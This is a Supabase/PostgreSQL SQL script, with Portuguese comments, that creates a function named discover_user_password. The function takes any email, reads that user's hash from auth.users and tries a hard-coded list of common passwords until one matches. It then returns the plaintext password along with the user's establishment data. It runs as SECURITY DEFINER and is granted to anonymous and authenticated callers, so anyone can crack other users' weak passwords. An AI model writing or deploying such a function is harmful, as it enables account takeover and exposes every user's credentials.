-- Função para descobrir a senha real do usuário
-- Execute este SQL no Supabase Dashboard

CREATE OR REPLACE FUNCTION discover_user_password(user_email TEXT)
RETURNS JSONB AS $$
DECLARE
  user_record RECORD;
  establishment_record RECORD;
  common_passwords TEXT[] := ARRAY[
    '123456', 'password', '123456789', '12345678', '12345', '1234567',
    '1234567890', 'qwerty', 'abc123', '111111', '123123', 'admin',
    'letmein', 'welcome', 'monkey', '1234', 'dragon', 'master',
    'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1', '654321',
    'jordan23', 'harley', 'password1', '123qwe', 'robert', 'matthew',
    'jordan', 'asshole', 'daniel', 'andrew', 'joshua', 'michael',
    'charlie', 'michelle', 'jessica', 'pepper', '1234', 'zxcvbn',
    'superman', 'qazwsx', 'maggie', 'computer', 'amanda', 'summer',
    'hockey', 'ranger', 'banana', 'passw0rd', 'tigger', 'sunshine',
    'chocolate', 'anthony', '1111', 'diamond', 'test', 'merlin',
    'secret', 'dallas', 'jennifer', 'joshua', 'mickey', 'mustang',
    'shadow', 'monkey', 'jordan', 'superman', 'harley', 'ranger',
    'buster', 'soccer', 'hockey', 'killer', 'george', 'sexy',
    'andrew', 'charlie', 'superman', 'asshole', 'fuckyou', 'dallas',
    'jessica', 'panties', 'pepper', '1234', 'zxcvbn', 'trustno1',
    'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbn', 'asdfgh',
    'hunter', 'buster', 'soccer', 'hockey', 'killer', 'george',
    'sexy', 'andrew', 'charlie', 'superman', 'asshole', 'fuckyou',
    'dallas', 'jessica', 'panties', 'pepper', '1234', 'zxcvbn',
    'trustno1', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbn'
  ];
  password_attempt TEXT;
  i INTEGER;
BEGIN
  -- Buscar o usuário
  SELECT id, email, created_at
  INTO user_record
  FROM auth.users
  WHERE email = user_email;

  IF user_record IS NULL THEN
    RETURN jsonb_build_object(
      'success', false,
      'error', 'Usuário não encontrado'
    );
  END IF;

  -- Buscar o estabelecimento (se existir)
  SELECT id, name, code
  INTO establishment_record
  FROM establishments
  WHERE owner_id = user_record.id;

  -- Tentar senhas comuns
  FOR i IN 1..array_length(common_passwords, 1) LOOP
    password_attempt := common_passwords[i];
    
    -- Verificar se a senha criptografada corresponde
    IF crypt(password_attempt, (SELECT encrypted_password FROM auth.users WHERE id = user_record.id)) = 
       (SELECT encrypted_password FROM auth.users WHERE id = user_record.id) THEN
      
      RETURN jsonb_build_object(
        'success', true,
        'user_id', user_record.id,
        'user_email', user_record.email,
        'real_password', password_attempt,
        'created_at', user_record.created_at,
        'has_establishment', establishment_record IS NOT NULL,
        'establishment_id', establishment_record.id,
        'establishment_name', establishment_record.name,
        'establishment_code', establishment_record.code,
        'password_found', true
      );
    END IF;
  END LOOP;

  -- Se não encontrou, retornar que não foi possível descobrir
  RETURN jsonb_build_object(
    'success', true,
    'user_id', user_record.id,
    'user_email', user_record.email,
    'real_password', 'Senha não encontrada (não é uma senha comum)',
    'created_at', user_record.created_at,
    'has_establishment', establishment_record IS NOT NULL,
    'establishment_id', establishment_record.id,
    'establishment_name', establishment_record.name,
    'establishment_code', establishment_record.code,
    'password_found', false
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Conceder permissões
GRANT EXECUTE ON FUNCTION discover_user_password(TEXT) TO anon;
GRANT EXECUTE ON FUNCTION discover_user_password(TEXT) TO authenticated;

-- Comentário
COMMENT ON FUNCTION discover_user_password(TEXT) IS 'Tenta descobrir a senha real do usuário testando senhas comuns';
